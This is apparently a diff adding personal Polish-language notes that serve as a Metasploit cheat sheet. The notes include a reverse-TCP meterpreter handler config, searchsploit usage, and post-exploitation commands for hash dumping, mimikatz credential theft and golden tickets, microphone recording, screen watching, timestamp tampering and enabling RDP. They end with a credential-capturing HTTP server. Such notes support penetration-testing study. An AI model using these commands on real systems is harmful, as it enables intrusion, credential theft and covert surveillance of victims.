@@ -1,0 +1,102 @@
+Opis:
+Program do lamania zabezpieczen:
+
+msfdb init - inicjalizacja bazy danych
+
+Program podsiada modol encoder do obfuskacji kodu.
+
+Plik konfiguracyjny:
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST eth0
+set LPORT 4444
+run -j
+
+msfconsole -r plik.rc
+
+
+Wyszukiwanie exploitow:
+→ searchsploit <szukana fraza>
+→ searchsploit -m <nazwa wysukanego exploita)          (migracja exploita do aktualnego katalogu)
+
+→ cd /usr/share/metasploit-framework/modules
+   ⇒ tree -L 1 auxiliary
+
+Commands:
+→ sessions                                                (Pokazuje aktualne sesje)
+→ sessions -K                                            (Zamyka wszystkie sesje)
+→ sessions -i <numer_sesji>                      (Przlaczy nas do sesji)
+→ background                                            (wychodzi z sesji i zostawia ja w tle)
+→ show advanced                                      (opcje zaawansowane)
+→ jobs                                                       (Pokaze czy sa jakies roboty uruchomione w tle)
+→ search <fraza>                                      (wyszukuje exploity w swojej bazie)
+   ⇒ info <nr wyszukania>
+   ⇒ use <nr wyszukania>
+→ unset
+→ unset all                                                 (czysci wszystkie parametry)
+→ steg                                                       (dziala jak set tylko ustawia la wszystkich modolow jak np. sie przelaczymy)
+→ unsetg                                                   (usuwa dana wartosc wszedzie)
+→ exploit -z                                               (uruchomi exploita i sesje w tle)
+
+
+
+
+msf> db_status - pokazuje czy jestesmy polaczeni z baza
+msf> info - wyswietla informacje o wybranym module
+msf> connect <ip> <port> - sprawdza polaczenie 
+msf> setg - definiuje zmienne globalne
+msf> get - wyswietla zmienna
+msf> spool - zapisuje stan msfconsole w pliku
+msf> save - zapisuje ustawienia 
+msf> load - laduje dodatkowe moduly
+msf> hosts - wyswietla hosty
+msf> services - wyswietla servisy
+
+[nmap]
+msf> db_nmap -sV <ip_machine>
+
+Command po wybraniu opcji / eksploita:
+→ info
+→ set RHOSTS <ip address>
+→ set LHOSTS <ip address>
+→ show targets
+→ run
+→ run -j                                  (uruchomienie w tle)
+
+
+Command METERPRETER:
+→ migrate <numer_procesu>
+→ migrate -N <nazwa_procesu>
+→ sysinfo
+→ getuid
+→ load kiwi
+→ ?                                                                       (help)
+→ shell
+→ shell -t                                                              (odrazu przechodzi do konsoli systemu)
+→ run post/multi/recon/local_exploit_suggester
+→ getprivs                                                           (pokazuje uprawnienia)
+→ upload                                                             (transportuje plik na maszyne)
+→ run <modul>                                                  (uruchamia moduly na maszynie)
+   ⇒ run post/windows/gather/checkvm
+   ⇒ run post/multi/recon/local_exploit_suggester
+   ⇒ run post/windows/manage/enable_rdp
+   ⇒ run autoroute -h                                           (auto routing na naszej ofierze)
+   ⇒ run post/windows/manage/enable_rdp         (uruchamia usluge zdalnego pulpitu na mszynie)
+
+→ hashdump        (zrzuca wszystkie hashe)
+→ screenshare      (pozwala ogladac zdalny pulpit uzytkownika)
+→ record_mic        (Nagrywa z mikrofonu na maszynie)
+→ timestomp        (pozwala modyfikowac znaczniki czasu)
+
+
+Command Kiwi (mimikatz):
+→ creds_all
+→ golden_ticket_create
+→ help                                  (wyswietli opcje)
+
+Example:
+[Server http z logowaniem]
+1.Open command prompt and type: msfconsole
+2.In Metasploit (msf > prompt) type: use auxiliary/server/capture/http_basic
+3.In Metasploit (msf > prompt) type: set uripath x
+4.In Metasploit (msf > prompt) type: run
